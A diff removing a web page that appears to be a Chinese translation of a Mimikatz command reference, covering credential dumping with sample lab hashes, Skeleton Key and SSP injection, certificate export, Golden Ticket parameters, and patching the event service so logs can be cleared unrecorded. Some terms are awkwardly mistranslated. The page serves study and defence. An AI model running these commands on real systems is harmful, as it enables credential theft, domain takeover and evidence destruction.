-<li><a href="https://adsecurity.org/?page_id=1821#MISCMemSSP" target="_blank" rel="noopener">MISC::MemSSP</a> - 注入恶意Windows SSP以记录本地经过身份验证的凭据。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#MISCSkeleton" target="_blank" rel="noopener">MISC::Skeleton</a> - 在域控制器上将Skeleton Key注入LSASS进程。这使得对Skeleton Key修补DC的所有用户身份验证都可以使用“主密码”（也称为Skeleton Keys）以及通常的密码。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#PRIVILEGEDebug" target="_blank" rel="noopener">PRIVILEGE::Debug</a> - 获取debug权限（许多Mimikatz命令需要此权限或本地系统权限）。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAEkeys" target="_blank" rel="noopener">SEKURLSA::Ekeys</a> - 列出Kerberos加密密钥</li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKerberos" target="_blank" rel="noopener">SEKURLSA::Kerberos</a> - 列出所有经过身份验证的用户（包括服务和计算机帐户）的Kerberos凭据</li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKrbtgt" target="_blank" rel="noopener">SEKURLSA::Krbtgt</a> - 获取Domain Kerberos服务帐户（KRBTGT）密码数据</li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords" target="_blank" rel="noopener">SEKURLSA::LogonPasswords</a> - 列出所有可用的提供者凭据。这通常显示最近登录的用户和计算机凭据。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAPth" target="_blank" rel="noopener">SEKURLSA::Pth</a> - Pass- theHash和Over-the-the-Hash</li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSATickets" target="_blank" rel="noopener">SEKURLSA::Tickets</a> - 列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户下运行的服务。与kerberos::list不同，sekurlsa使用内存读取，不受关键出口限制。sekurlsa可以访问其他会话（用户）的门票。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#TOKENList" target="_blank" rel="noopener">TOKEN::List</a> - 列出系统的所有令牌</li>
-<li><a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">TOKEN::Elevate</a> - 模拟令牌。用于将权限提升为SYSTEM（默认）或在框中查找域管理员令牌</li>
-<li><a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">TOKEN::Elevate / domainadmin</a> - 使用域管理员凭据模拟令牌。</li>
-</ul>
-<h3 id="ADSecurity-Mimikatz帖子："><a href="#ADSecurity-Mimikatz帖子：" class="headerlink" title="ADSecurity Mimikatz帖子："></a><strong>ADSecurity Mimikatz帖子：</strong></h3><p>所有帖子提到Mimikatz：<a href="https://adsecurity.org/?tag=mimikatz" target="_blank" rel="noopener">ADSecurity.org Mimikatz Posts</a></p>
-<ul>
-<li><a href="https://adsecurity.org/?p=556" target="_blank" rel="noopener">Mimikatz和Active Directory Kerberos攻击</a></li>
-<li><a href="https://adsecurity.org/?p=2053" target="_blank" rel="noopener">使用Mimikatz DCSync转储域中所有管理员的明文密码</a></li>
-<li><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">攻击者如何使用Kerberos Silver Tickets来利用系统</a></li>
-<li><a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener">Mimikatz DCSync使用，利用和检测</a></li>
-<li><a href="https://adsecurity.org/?p=1760" target="_blank" rel="noopener">偷偷摸摸的Active Directory持久性＃12：恶意安全支持提供程序（SSP）</a></li>
-<li><a href="https://adsecurity.org/?p=1714" target="_blank" rel="noopener">偷偷摸摸的Active Directory持久性＃11：目录服务还原模式（DSRM）</a></li>
-<li><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">Kerberos金票现在更加黄金</a></li>
-<li><a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">全是关于信任 - 在Active Directory信任中伪造Keroos信任票到欺骗访问</a></li>
-<li><a href="https://adsecurity.org/?p=1567" target="_blank" rel="noopener">检测Mimikatz使用</a></li>
-</ul>
-<h3 id="Mimikatz指南："><a href="#Mimikatz指南：" class="headerlink" title="Mimikatz指南："></a><strong>Mimikatz指南：</strong></h3><p>Mimikatz可以通过简单地运行“Mimikatz.exe”或传递命令并退出（例如：’ <em>Mimikatz“kerberos::list”exit’</em>）以交互模式执行。Invoke-Mimikatz没有交互模式。</p>
-<p>Mimikatz可用于将命令从命令行传递到Mimikatz以按顺序处理，这对于Invoke-Mimikatz或在脚本中使用Mimikatz非常有用。执行完最后一个命令后，追加“退出”退出Mimikatz（这样做，所以Mimikatz优雅地退出）。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\temp\mimikatz&gt;.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.#####.   mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Nov 13 2015 00:44:32)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"> ## / \ ##  /* * *</span><br><span class="line"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> &apos;## v ##&apos;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line"> &apos;#####&apos;                                     with 17 modules * * */</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line"> Privilege &apos;20&apos; OK</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uthentication Id : 0 ; 646260 (00000000:0009dc74)</span><br><span class="line"> Session           : RemoteInteractive from 2</span><br><span class="line"> User Name         : adsadministrator</span><br><span class="line"> Domain            : ADSECLAB</span><br><span class="line"> Logon Server      : ADSDC03</span><br><span class="line"> Logon Time        : 11/27/2015 11:41:27 AM</span><br><span class="line"> SID               : S-1-5-21-1581655573-3923512380-696647894-500</span><br><span class="line"> msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> [00010000] CredentialKeys</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> tspkg :</span><br><span class="line"> wdigest :</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * Password : (null)</span><br><span class="line"> kerberos :</span><br><span class="line"> * Username : adsadministrator</span><br><span class="line"> * Domain   : LAB.ADSECURITY.ORG</span><br><span class="line"> * Password : (null)</span><br><span class="line"> ssp :   KO</span><br></pre></td></tr></table></figure>
-<p>交互模式提供“Mimikatz控制台”，可以在其中实时输入和执行命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\temp\mimikatz&gt; .\mimikatz</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.#####.   mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Nov 13 2015 00:44:32)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"> ## / \ ##  /* * *</span><br><span class="line"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> &apos;## v ##&apos;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line"> &apos;#####&apos;                                     with 17 modules * * */</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line"> Privilege &apos;20&apos; OK</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 646260 (00000000:0009dc74)</span><br><span class="line"> Session           : RemoteInteractive from 2</span><br><span class="line"> User Name         : adsadministrator</span><br><span class="line"> Domain            : ADSECLAB</span><br><span class="line"> Logon Server      : ADSDC03</span><br><span class="line"> Logon Time        : 11/27/2015 11:41:27 AM</span><br><span class="line"> SID               : S-1-5-21-1581655573-3923512380-696647894-500</span><br><span class="line"> msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> [00010000] CredentialKeys</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> tspkg :</span><br><span class="line"> wdigest :</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * Password : (null)</span><br><span class="line"> kerberos :</span><br><span class="line"> * Username : adsadministrator</span><br><span class="line"> * Domain   : LAB.ADSECURITY.ORG</span><br><span class="line"> * Password : (null)</span><br><span class="line"> ssp :   KO</span><br><span class="line"> credman :</span><br></pre></td></tr></table></figure>
-<h3 id="Mimikatz命令参考-："><a href="#Mimikatz命令参考-：" class="headerlink" title="Mimikatz命令参考**："></a>Mimikatz命令参考<strong>**：</strong></h3><p><strong>Mimikatz版本历史</strong></p>
-<h4 id="Mimikatz模块："><a href="#Mimikatz模块：" class="headerlink" title="Mimikatz模块："></a>Mimikatz模块：</h4><ul>
-<li><a href="https://adsecurity.org/?page_id=1821#BUSYLIGHT" target="_blank" rel="noopener">BUSYLIGHT</a></li>
-<li>CRYPTO<ul>
-<li><a href="https://adsecurity.org/?page_id=1821#CRYPTOCertificates" target="_blank" rel="noopener">CRYPTO ::证书</a></li>
-</ul>
-</li>
-<li><a href="https://adsecurity.org/?page_id=1821#DPAPI" target="_blank" rel="noopener">DPAPI</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#EVENT" target="_blank" rel="noopener">事件</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#IIS" target="_blank" rel="noopener">IIS</a></li>
-<li>KERBEROS<ul>
-<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSGolden" target="_blank" rel="noopener">金门票</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#SilverTicket" target="_blank" rel="noopener">银色门票</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#TrustTicket" target="_blank" rel="noopener">信托票</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSPTT" target="_blank" rel="noopener">KERBEROS::PTT</a></li>
-</ul>
-</li>
-<li>LSADUMP<ul>
-<li><a href="https://adsecurity.org/?page_id=1821#DCSync" target="_blank" rel="noopener">DCSync</a></li>
-<li>DCShadow</li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPLSA" target="_blank" rel="noopener">LSADUMP::LSA</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPNetSync" target="_blank" rel="noopener">LSADUMP::NetSync</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPSAM" target="_blank" rel="noopener">LSADUMP::SAM</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPTrust" target="_blank" rel="noopener">LSADUMP ::TRUST</a></li>
-</ul>
-</li>
-<li><a href="https://adsecurity.org/?page_id=1821#MISC" target="_blank" rel="noopener">MISC</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#MINESWEEPER" target="_blank" rel="noopener">MINESWEEPER</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#Net" target="_blank" rel="noopener">Net</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#PRIVILEGE" target="_blank" rel="noopener">PRIVILEGE</a><ul>
-<li><a href="https://adsecurity.org/?page_id=1821#PRIVILEGEDebug" target="_blank" rel="noopener">PRIVILEGE ::debug</a></li>
-</ul>
-</li>
-<li><a href="https://adsecurity.org/?page_id=1821#PROCESS" target="_blank" rel="noopener">PROCESS</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#RPC" target="_blank" rel="noopener">RPC</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#SERVICE" target="_blank" rel="noopener">SERVICE</a></li>
-<li>SEKURLSA<ul>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKerberos" target="_blank" rel="noopener">SEKURLSA::Kerberos的</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKrbtgt" target="_blank" rel="noopener">SEKURLSA::KRBTGT</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords" target="_blank" rel="noopener">SEKURLSA::LogonPasswords</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAPth" target="_blank" rel="noopener">SEKURLSA ::Pth</a></li>
-</ul>
-</li>
-<li><a href="https://adsecurity.org/?page_id=1821#SID" target="_blank" rel="noopener">SID</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#STANDARD" target="_blank" rel="noopener">STANDARD</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#SYSENV" target="_blank" rel="noopener">SYSENV</a></li>
-<li>TOKEN<ul>
-<li>TOKEN ::<a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">Elevate</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">TOKEN::Elevate / domainadmin</a></li>
-</ul>
-</li>
-<li><a href="https://adsecurity.org/?page_id=1821#TS" target="_blank" rel="noopener">TS</a></li>
-<li><a href="https://adsecurity.org/?page_id=1821#VAULT" target="_blank" rel="noopener">VAULT</a></li>
-</ul>
-<p>注意：任何标记为“experimental”的项目都只能在测试环境中使用。</p>
-<h3 id="BUSYLIGHT"><a href="#BUSYLIGHT" class="headerlink" title="BUSYLIGHT"></a><strong>BUSYLIGHT</strong></h3><p>BUSYLIGHT Mimikatz模块提供连接<a href="http://blog.cobaltstrike.com/2015/11/11/revolutionary-device-detects-mimikatz-use/" target="_blank" rel="noopener">BusyLights的</a>附加信息和控制。</p>
-<p><strong>BUSYLIGHT::List</strong></p>
-<p><strong>BUSYLIGHT::</strong>Off</p>
-<p><strong>BUSYLIGHT::Single</strong></p>
-<p><strong>BUSYLIGHT::Status</strong></p>
-<p>BUSYLIGHT::Test</p>
-<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a><strong>CRYPTO</strong></h3><p>CRYPTO Mimikatz模块提供了与Windows加密功能（<a href="https://msdn.microsoft.com/en-us/library/ms867086.aspx" target="_blank" rel="noopener">CryptoAPI</a>）接口的高级功能。<br>典型用途是导出未标记为“可导出”的证书。</p>
-<p><strong>CRYPTO::CAPI</strong> - （实验性）Patch CryptoAPI层，便于导出</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI.jpg" alt="Mimikatz-加密CAPI"></a></p>
-<p><strong>CRYPTO ::Certificates</strong> - 列出/出口证书</p>
-<p>Carlos Perez（又名<a href="https://twitter.com/Carlos_Perez" target="_blank" rel="noopener">DarkOperator</a>）有<a href="http://www.darkoperator.com/blog/2013/6/11/stealing-user-certificates-with-meterpreter-mimikatz-extensi.html" target="_blank" rel="noopener">一篇关于使用Mimikatz导出证书的博文</a>。<br>此命令列出了其密钥的证书和属性。它也可以导出证书。通常需要“privilege::debug”</p>
-<ul>
-<li>/systemstore - 可选 - 必须使用的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER）</li>
-<li>/store - 可选 - 必须用于列出/导出证书的商店（默认值：My） - 带有crypto::stores的完整列表</li>
-<li>/export - 可选 - 将所有证书导出到文件（DER中的公共部分，PFX文件中的私有部分 - 密码保护：mimikatz）</li>
-</ul>
-<p>本杰明对CRYPTO的评论：证书：</p>
-<ul>
-<li>有关列表，请参阅<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#stores" target="_blank" rel="noopener"><code>crypto::stores</code></a>有效<code>systemstore</code>列表及其输出<code>store</code>。</li>
-<li>不可导出的密钥（带<code>KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)</code>）通常可以用<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi" target="_blank" rel="noopener"><code>crypto::capi</code></a>和/或导出<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng" target="_blank" rel="noopener"><code>crypto::cng</code></a></li>
-<li>尽管<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi" target="_blank" rel="noopener"><code>crypto::capi</code></a>或<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng" target="_blank" rel="noopener"><code>crypto::cng</code></a>补丁，您必须在文件系统上具有正确的ACL才能访问私钥（UAC … !）</li>
-<li>一些<strong>智能卡</strong>加密提供商可以报告成功的私人出口（当然不是</li>
-</ul>
-<p><strong>CRYPTO::CertToHW</strong>  - 尝试将软件CA导出到加密（虚拟）硬件</p>
-<p><strong>CRYPTO::CNG</strong> - （实验性）修补CNG服务，便于导出（补丁“KeyIso”服务）</p>
-<p><strong>CRYPTO::Extract -</strong>  [experimental]从CAPI RSA / AES提供程序中提取密钥</p>
-<p><strong>CRYPTO::Hash</strong> - 使用可选的用户<strong>名哈希</strong>密码</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Crypto-Hash.png" alt="img"></p>
-<p><strong>CRYPTO::Keys</strong> - 列出/导出密钥容器</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Crypto-Keys.png" alt="img"></p>
-<p><strong>CRYPTO::Providers</strong> - 列出加密提供商</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers.jpg" alt="Mimikatz-加密提供商"></a></p>
-<p><strong>CRYPTO::SC</strong>  - 列出智能卡读卡器</p>
-<p><strong>CRYPTO::SCAuth</strong> - 从CA创建身份验证证书（类似智能卡）</p>
-<p><strong>CRYPTO::Stores</strong> –列出加密商店</p>
-<ul>
-<li>/systemstore - 可选 - 必须用于列出存储的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER）</li>
-</ul>
-<p>存储选项：<br>CERT_SYSTEM_STORE_CURRENT_USER或CURRENT_USER<br>CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY或USER_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE或LOCAL_MACHINE<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY或LOCAL_MACHINE_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE或LOCAL_MACHINE_ENTERPRISE<br>CERT_SYSTEM_STORE_CURRENT_SERVICE或CURRENT_SERVICE<br>CERT_SYSTEM_STORE_USERS或使用者<br>CERT_SYSTEM_STORE_SERVICES或服务</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores.jpg" alt="Mimikatz-加密存储"></a></p>
-<p><strong>CRYPTO::System</strong> - 描述Windows系统证书（文件，TODO：注册表或配置单元）。</p>
-<h3 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a><strong>DPAPI</strong></h3><p>DPAPI Mimikatz模块提供使用DPAPI提取Windows存储（和受保护）凭据数据的功能。  <a href="https://msdn.microsoft.com/en-us/library/ms995355.aspx" target="_blank" rel="noopener">DPAPI</a>是保护（加密）本地数据（通常是密码）的官方Windows方法。</p>
-<blockquote>
-<p>从Microsoft®Windows®2000开始，操作系统开始提供数据保护应用程序编程接口（API）。此数据保护API（DPAPI）是一对函数调用，为用户和系统进程提供操作系统级数据保护服务。通过操作系统级，我们指的是由操作系统本身提供的服务，不需要任何其他库。通过数据保护，我们指的是通过使用加密来提供数据机密性的服务。由于数据保护是操作系统的一部分，因此每个应用程序现在都可以保护数据，而不需要除了对DPAPI进行必要的函数调用之外的任何特定加密代码。这些调用是两个简单的函数，具有修改DPAPI行为的各种选项。总体，</p>
-<p>DPAPI是一种基于密码的数据保护服务。它需要密码才能提供保护。当然，缺点是DPAPI提供的所有保护都依赖于提供的密码。DPAPI使用经过验证的加密例程，特别是强大的Triple-DES算法和强密钥来抵消这一点，我们将在后面详细介绍。由于DPAPI专注于为用户提供保护并需要密码来提供此保护，因此它在逻辑上使用用户的登录密码进行保护。</p>
-</blockquote>
-<p>以前在攻击DPAPI方面做了一些工作：</p>
-<ul>
-<li><a href="https://www.elie.net/publication/reversing-dpapi-and-stealing-windows-secrets-offline" target="_blank" rel="noopener">扭转DPAPI和脱机Windows密码</a></li>
-<li><a href="http://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28" target="_blank" rel="noopener">DPAPI秘密。DPAPI中的安全性分析和数据恢复</a></li>
-</ul>
-<p>Benjamin Delpy在OneDrive上有一个Excel电子表格，其中列出了可能存储凭据的Windows位置 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&amp;app=Excel" target="_blank" rel="noopener">在线查看电子表格</a>。</p>
-<p><strong>DPAPI::Blob</strong> - 使用API或Masterkey取消保护DPAPI blob</p>
-<p><strong>DPAPI:Cache</strong></p>
-<p><strong>DPAPI::CAPI</strong> - CAPI密钥测试</p>
-<p><strong>DPAPI::Chrome</strong>  - Chrome测试</p>
-<p><strong>DPAPI::CNG</strong> - CNG关键测试</p>
-<p><strong>DPAPI::Cred</strong> - CRE测试</p>
-<p><strong>DPAPI::CredHist</strong> - 配置Credhist文件</p>
-<p><strong>DPAPI::MasterKey</strong> - 配置Masterkey文件，unprotect（取决于密钥）</p>
-<p><strong>DPAPI::Protect</strong> - 使用DPAPI保护数据</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-DPAPI-Protect.png" alt="img"></p>
-<p><strong>DPAPI::Vault</strong> - VAULT测试</p>
-<p><strong>DPAPI::WIFI</strong> - WIFI测试（需要XML配置文件 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&amp;app=Excel" target="_blank" rel="noopener">参考Ben的电子表格</a>）</p>
-<p><strong>DPAPI::WWAN</strong> - WWAN测试（需要XML配置文件 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&amp;app=Excel" target="_blank" rel="noopener">参考Ben的电子表格</a>）</p>
-<h3 id="事件EVENT"><a href="#事件EVENT" class="headerlink" title="事件EVENT**"></a><strong>事件</strong>EVENT<em>**</em></h3><p><strong>EVENT::Clear</strong> - 清除事件日志<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png" target="_blank" rel="noopener"><br><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png" alt="Mimikatz-事件清除"></a></p>
-<p><strong>EVENT ::: Drop</strong> - （<strong>*实验性*</strong>）Patch Events服务以避免新事件</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png" alt="Mimikatz-事件降"></a></p>
-<p>注意：<br>运行privilege::debug然后运行event::drop来修补事件日志。然后运行Event::Clear以清除事件日志，而不记录任何日志清除事件（1102）。</p>
-<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a><strong>IIS</strong></h3><p>IIS XML配置模块</p>
-<p><strong>IIS::APPHOST</strong></p>
-<h3 id="KERBEROS"><a href="#KERBEROS" class="headerlink" title="KERBEROS"></a><strong>KERBEROS</strong></h3><p>KERBEROS Mimikatz模块用于与官方Microsoft Kerberos API连接。<br>此模块中的命令不需要特殊权限。</p>
-<p><strong>KERBEROS::Ask</strong> - 要求TGS门票</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Ask.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Ask.jpg" alt="Mimikatz-Kerberos的问"></a></p>
-<p><strong>KERBEROS::Clist</strong> - 列出MIT / Heimdall ccache的门票</p>
-<p><strong>KERBEROS::Golden</strong> - 创建<a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">黄金</a> / <a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">白银</a> / <a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">信任</a>票据<br>此命令的功能基于检索到的密码哈希类型。</p>
-<table>
-<thead>
-<tr>
-<th><strong>类型</strong></th>
-<th><strong>需求</strong></th>
-<th><strong>范围</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">金色</a></td>
-<td>KRBTGT哈希</td>
-<td>域/林</td>
-</tr>
-<tr>
-<td><a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">银</a></td>
-<td>服务哈希</td>
-<td>服务</td>
-</tr>
-<tr>
-<td><a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">相信</a></td>
-<td>信任哈希</td>
-<td>域/林 - &gt;域/林 （基于帐户访问）</td>
-</tr>
-</tbody>
-</table>
-<h4 id="Golden-Ticket金票"><a href="#Golden-Ticket金票" class="headerlink" title="Golden Ticket金票"></a><strong>Golden Ticket金票</strong></h4><p>Golden Ticket是使用KRBTGT NTLM密码哈希加密和签名的TGT。</p>
-<p>可以创建Golden Ticket（GT）以模拟域中任何用户（真实的或想象的）作为域中任何组的成员（提供几乎无限量的权限）到域中的任何和每个资源。由于Golden Ticket是身份验证票证（下面描述的TGT），因此其范围是整个域（以及利用SID历史记录的AD林），因为TGT用于获取用于访问资源的服务票证（TGS）。Golden Ticket（TGT）包含用户组成员资格信息（PAC），并使用域的Kerberos服务帐户（KRBTGT）进行签名和加密，该帐户只能由KRBTGT帐户打开和读取。</p>
-<p>总而言之，一旦攻击者获得了对KRBTGT密码哈希的访问权限，他们就可以创建Golden Tickets（TGT），随时提供对AD中任何内容的访问。</p>
-<p>Mimikatz金票命令参考：</p>
-<p>创造黄金票的Mimikatz命令是“kerberos::golden”</p>
-<ul>
-<li>/ domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。</li>
-<li>/ sid - 域的SID。在此示例中：“S-1-5-21-1473643419-774954089-2222329127”。</li>
-<li>/ sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的Enterprise Admins组。Ť <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">他的参数将提供的小岛屿发展中国家的SID历史参数。</a></li>
-<li>/user - 模拟用户名</li>
